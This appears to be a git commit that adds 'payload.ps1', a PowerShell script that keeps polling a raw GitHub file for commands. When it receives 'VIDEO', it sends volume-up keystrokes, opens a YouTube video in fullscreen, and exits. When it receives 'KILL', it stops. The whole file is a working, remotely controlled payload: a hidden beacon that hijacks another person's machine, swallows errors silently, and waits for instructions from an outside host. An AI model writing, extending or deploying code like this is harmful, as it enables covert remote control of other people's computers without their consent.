81e4c4ab3b702056053355ae73a56dc1f0ad6c7e
Thiago Pereira <100003836+Thiii123@users.noreply.github.com>
2026-01-11 16:00:05 -0300

    Create payload.ps1

---
+++ payload.ps1
@@ -0,0 +1,24 @@
+$urlOrdem = "https://raw.githubusercontent.com/Thiii123/my-tools/main/action.txt"
+
+while($true) {
+    try {
+        # Baixa a palavra escrita no action.txt
+        $comando = (Invoke-WebRequest -Uri $urlOrdem -UseBasicParsing).Content.Trim()
+
+        if ($comando -eq "VIDEO") {
+            $obj = New-Object -ComObject WScript.Shell
+            for($i=0; $i -le 50; $i++) { $obj.SendKeys([char]175) }
+            start "https://www.youtube.com/watch?v=qHoAEWK59nE&list=RDqHoAEWK59nE&start_radio=1"
+            Start-Sleep -Seconds 5
+            $obj.SendKeys('f')
+            
+            # Opcional: faz o script parar após executar uma vez
+            exit 
+        }
+        elseif ($comando -eq "KILL") {
+            exit # Fecha o script remotamente
+        }
+    } catch { }
+    
+    Start-Sleep -Seconds 10 # Verifica a cada 10 segundos
+}
